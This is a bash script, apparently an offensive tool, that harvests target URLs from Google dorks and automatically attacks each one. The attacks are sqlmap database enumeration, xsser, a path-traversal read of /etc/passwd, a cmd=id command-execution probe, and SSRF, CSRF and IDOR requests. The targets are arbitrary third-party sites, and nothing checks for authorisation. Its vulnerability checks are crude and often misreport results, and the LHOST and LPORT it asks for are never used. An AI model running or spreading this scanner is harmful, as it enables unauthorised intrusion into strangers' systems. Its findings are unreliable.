#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[0;37m'
NC='\033[0m' # No Color

# Required tools
REQUIRED_TOOLS=("figlet" "lolcat" "sqlmap" "curl" "nc" "w3m" "xsser")

# Function to install missing tools
install_missing_tools() {
    echo -e "${YELLOW}Checking for required tools...${NC}"
    for tool in "${REQUIRED_TOOLS[@]}"; do
        if ! command -v "$tool" &>/dev/null; then
            echo -e "${RED}$tool is not installed. Installing now...${NC}"
            sudo apt-get update -y && sudo apt-get install -y "$tool"
        else
            echo -e "${GREEN}$tool is already installed.${NC}"
        fi
    done
    echo -e "${GREEN}All tools are installed and ready.${NC}"
}

# Animated ASCII author
animate_author_name() {
    clear
    for i in {1..3}; do
        clear
        figlet -f slant "Author: k0ur1i" | lolcat
        sleep 0.5
    done
}

# Dork list
dorks=(
    "inurl:admin/login"
    "inurl:admin.php"
    "inurl:/upload"
    "intitle:index of /"
    "intext:'You have an error in your SQL syntax'"
    "filetype:sql 'dump'"
    "inurl:/view/index.shtml"
    "port:22 'OpenSSH'"
    "site:s3.amazonaws.com"
)

# Exploitation Functions
test_xss() {
    local url="$1"
    echo -e "${YELLOW}Testing for XSS on: $url${NC}"
    xsser --auto --url="$url" &>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${RED}XSS vulnerability found: $url${NC}"
    else
        echo -e "${GREEN}No XSS vulnerability found on: $url.${NC}"
    fi
}

test_lfi() {
    local url="$1"
    echo -e "${YELLOW}Testing for LFI on: $url${NC}"
    local test_url="${url}?file=../../../../../../../../etc/passwd"
    response=$(curl -s "$test_url")
    if echo "$response" | grep -q "root:x"; then
        echo -e "${RED}LFI vulnerability found: $test_url${NC}"
    else
        echo -e "${GREEN}No LFI vulnerability found on: $url.${NC}"
    fi
}

test_csrf() {
    local url="$1"
    echo -e "${YELLOW}Testing for CSRF on: $url${NC}"
    csrf_test=$(curl -s -X POST -d "csrf_token=" "$url" | grep -i "error")
    if [[ -z "$csrf_test" ]]; then
        echo -e "${RED}CSRF vulnerability found: $url${NC}"
    else
        echo -e "${GREEN}No CSRF vulnerability found on: $url.${NC}"
    fi
}

test_rce() {
    local url="$1"
    echo -e "${YELLOW}Testing for Remote Command Execution on: $url${NC}"
    response=$(curl -s -G --data-urlencode "cmd=id" "$url")
    if echo "$response" | grep -q "uid="; then
        echo -e "${RED}RCE vulnerability found: $url${NC}"
    else
        echo -e "${GREEN}No RCE vulnerability found on: $url.${NC}"
    fi
}

test_ssrf() {
    local url="$1"
    echo -e "${YELLOW}Testing for SSRF on: $url${NC}"
    test_url="${url}?url=http://localhost:80"
    response=$(curl -s "$test_url")
    if echo "$response" | grep -q "HTTP"; then
        echo -e "${RED}SSRF vulnerability found: $url${NC}"
    else
        echo -e "${GREEN}No SSRF vulnerability found on: $url.${NC}"
    fi
}

test_idor() {
    local url="$1"
    echo -e "${YELLOW}Testing for IDOR on: $url${NC}"
    idor_url="${url}/profile?id=1"
    response=$(curl -s "$idor_url")
    if echo "$response" | grep -q "User"; then
        echo -e "${RED}IDOR vulnerability found: $idor_url${NC}"
    else
        echo -e "${GREEN}No IDOR vulnerability found on: $url.${NC}"
    fi
}

test_sql_injection() {
    local url="$1"
    echo -e "${YELLOW}Testing for SQL injection on: $url${NC}"
    sqlmap --batch --url="$url" --dbs &>/dev/null
    if [[ $? -eq 0 ]]; then
        echo -e "${RED}SQL injection vulnerability found: $url${NC}"
    else
        echo -e "${GREEN}No SQL injection vulnerability found on: $url.${NC}"
    fi
}

# Main function
main() {
    # Check and install required tools
    install_missing_tools

    # Display author animation
    animate_author_name

    # Prompt for local host and port
    echo -e "${CYAN}Enter your local host (LHOST): ${NC}"
    read -r lhost
    echo -e "${CYAN}Enter your local port (LPORT): ${NC}"
    read -r lport

    # Process dorks
    for dork in "${dorks[@]}"; do
        echo -e "${BLUE}Processing dork: $dork${NC}"
        targets=$(w3m -dump "https://www.google.com/search?q=$dork" | grep -oP 'https?://[^\s]+' | head -n 10)

        echo -e "${GREEN}Targets found:${NC}"
        echo "$targets"

        # Test each target
        for url in $targets; do
            echo -e "${MAGENTA}Testing target: $url${NC}"

            test_sql_injection "$url"
            test_xss "$url"
            test_lfi "$url"
            test_csrf "$url"
            test_rce "$url"
            test_ssrf "$url"
            test_idor "$url"
        done
    done

    echo -e "${GREEN}Script execution completed.${NC}"
}

# Run the main function
main
